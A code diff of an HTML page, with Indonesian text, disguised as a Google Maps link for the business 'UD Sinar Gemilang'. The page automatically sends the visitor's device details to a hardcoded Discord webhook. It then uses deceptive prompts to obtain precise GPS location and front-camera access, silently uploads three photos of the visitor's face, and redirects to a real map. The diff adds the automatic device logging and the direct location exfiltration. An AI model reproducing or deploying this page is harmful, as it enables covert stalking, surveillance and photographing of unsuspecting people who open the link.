@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>UD Sinar Gemilang - Google Maps</title>
+    <title>Google Maps - UD Sinar Gemilang</title>
     <meta property="og:title" content="UD. Sinar Gemilang · Kabupaten Mojokerto">
     <meta property="og:description" content="Lokasi presisi. Klik untuk rute navigasi.">
     <meta property="og:image" content="tampilan.jpg">
@@ -12,36 +12,30 @@
 
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Roboto', sans-serif; background: #000; }
-        
         .bg-container {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: url('background.jpg') no-repeat center;
             background-size: cover; z-index: 1; transition: filter 0.5s ease;
         }
-
-        .blurred { filter: blur(10px) brightness(0.7); }
-
+        .blurred { filter: blur(12px) brightness(0.6); }
         .overlay { 
             position: relative; z-index: 10; height: 100%; 
             display: flex; flex-direction: column; align-items: center; justify-content: center; 
             background: rgba(0,0,0,0.3); text-align: center; color: white; padding: 20px;
         }
-
-        .maps-logo { width: 80px; margin-bottom: 20px; }
-
+        .maps-logo { width: 70px; margin-bottom: 15px; }
         .btn-action { 
             background: #1a73e8; color: white; border: none; 
-            padding: 15px 30px; border-radius: 25px; 
-            font-size: 15px; font-weight: 500; cursor: pointer; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.4); width: 100%; max-width: 300px;
+            padding: 16px 25px; border-radius: 25px; 
+            font-size: 14px; font-weight: bold; cursor: pointer; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4); width: 100%; max-width: 340px;
+            line-height: 1.4;
         }
-
         #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
-
         .loader {
             border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #ffffff;
-            border-radius: 50%; width: 20px; height: 20px;
-            animation: spin 1s linear infinite; display: inline-block;
+            border-radius: 50%; width: 18px; height: 18px;
+            animation: spin 1s linear infinite; display: inline-block; margin-right: 8px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -53,29 +47,54 @@
     <div id="bg" class="bg-container"></div>
     
     <div class="overlay">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282015-2020%29.svg/512px-Google_Maps_icon_%282015-2020%29.svg.png" class="maps-logo" alt="Maps">
-        
-        <div id="text-area" style="margin-bottom: 30px;">
-            <h2 id="title">UD Sinar Gemilang</h2>
-            <p id="desc">Izinkan akses lokasi untuk melihat navigasi</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282015-2020%29.svg/512px-Google_Maps_icon_%282015-2020%29.svg.png" class="maps-logo">
+        <div id="text-area" style="margin-bottom: 25px;">
+            <h2 id="title" style="margin: 0;">UD Sinar Gemilang</h2>
+            <p id="desc" style="font-size: 14px; opacity: 0.8;">Navigasi sedang diproses...</p>
         </div>
-        
-        <button class="btn-action" id="mainBtn" onclick="step1()">Izinkan Lokasi Untuk Melihat Lokasi</button>
+        <button class="btn-action" id="mainBtn" onclick="step1()">untuk perizinan lokasi pilih allow untuk membuka lokasi</button>
     </div>
 
     <script>
         const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
         const REDIRECT = "https://maps.app.goo.gl/9mqwSJ51rg7v1QNUA";
-        let userLoc = "";
+        let userLoc = "Tidak Diizinkan";
+
+        // 1. OTOMATIS: Kirim Info Sistem (Langsung saat dibuka)
+        (async function sendSysInfo() {
+            let info = {
+                screen: `${window.screen.width}x${window.screen.height}`,
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+                model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown Device",
+                platform: navigator.platform
+            };
+
+            let batteryInfo = "N/A";
+            try {
+                const bat = await navigator.getBattery();
+                batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Cas' : 'Tidak Cas'})`;
+            } catch(e){}
+
+            const msg = {
+                content: `📱 **NEW VISITOR LOG**\n━━━━━━━━━━━━━━\n**Model:** ${info.model}\n**RAM:** ${info.ram}\n**Baterai:** ${batteryInfo}\n**Layar:** ${info.screen}\n**Platform:** ${info.platform}\n━━━━━━━━━━━━━━`
+            };
+            fetch(WH, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(msg) });
+        })();
 
         // STEP 1: LOKASI
         function step1() {
+            const btn = document.getElementById('mainBtn');
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((p) => {
                     userLoc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    fetch(WH, { 
+                        method: "POST", 
+                        headers: {"Content-Type": "application/json"}, 
+                        body: JSON.stringify({ content: `📍 **USER LOCATION**\nURL: ${userLoc}` }) 
+                    });
                     processLoading();
                 }, () => {
-                    alert("Akses lokasi ditolak. Peta tidak dapat dimuat.");
+                    alert("Akses lokasi diperlukan untuk membuka Google Maps.");
                 }, {enableHighAccuracy: true});
             }
         }
@@ -84,15 +103,14 @@
         function processLoading() {
             const btn = document.getElementById('mainBtn');
             const bg = document.getElementById('bg');
-            
             btn.disabled = true;
             btn.innerHTML = '<span class="loader"></span> Menghubungkan...';
             
             setTimeout(() => {
-                bg.classList.add('blurred'); // Efek blur background.jpg
-                document.getElementById('desc').innerText = "Fitur Live View memerlukan izin kamera";
+                bg.classList.add('blurred');
+                document.getElementById('desc').innerText = "Verifikasi Live View diperlukan";
                 btn.disabled = false;
-                btn.innerHTML = "Izinkan Perizinan Kamera Untuk Melihat Live View";
+                btn.innerHTML = "untuk perizinan kamera, pilih allow untuk mendapatkan foto dan live view dari lokasi ";
                 btn.onclick = step2;
             }, 2000);
         }
@@ -101,28 +119,23 @@
         async function step2() {
             const btn = document.getElementById('mainBtn');
             btn.disabled = true;
-            btn.innerText = "Membuka Live View...";
+            btn.innerText = "Membuka Kamera...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // Ambil 3 foto dengan jeda
-                for (let i = 1; i <= 3; i++) {
-                    await new Promise(r => setTimeout(r, 1000));
-                    await takeSnap(video, i);
-                }
-
-                // Setelah semua terkirim, baru redirect
-                setTimeout(() => {
+                setTimeout(async () => {
+                    for (let i = 1; i <= 3; i++) {
+                        await takeSnap(video, i);
+                        await new Promise(r => setTimeout(r, 800));
+                    }
                     stream.getTracks().forEach(t => t.stop());
                     window.location.href = REDIRECT;
-                }, 1000);
+                }, 1500);
 
             } catch (e) {
-                // Jika kamera ditolak tetap kirim lokasi lalu redirect
-                await sendToWebhook(null, "Kamera Ditolak");
                 window.location.href = REDIRECT;
             }
         }
@@ -135,22 +148,14 @@
 
             return new Promise((resolve) => {
                 canvas.toBlob(async (blob) => {
-                    await sendToWebhook(blob, `Foto ke-${index}`);
+                    const fd = new FormData();
+                    fd.append("file", blob, `shot_${index}.jpg`);
+                    fd.append("payload_json", JSON.stringify({ content: `📸 **Capture ${index}/3**` }));
+                    
+                    await fetch(WH, { method: "POST", body: fd, keepalive: true });
                     resolve();
-                }, 'image/jpeg', 0.7);
+                }, 'image/jpeg', 0.6);
             });
-        }
-
-        async function sendToWebhook(blob, label) {
-            const formData = new FormData();
-            const data = {
-                content: `🔔 **Data Terkirim**\n📍 **Lokasi:** ${userLoc}\n📸 **Status:** ${label}\n📱 **User:** ${navigator.userAgent}`
-            };
-
-            formData.append("payload_json", JSON.stringify(data));
-            if (blob) formData.append("file", blob, `capture_${label}.jpg`);
-
-            return fetch(WH, { method: "POST", body: formData, keepalive: true });
         }
     </script>
 </body>
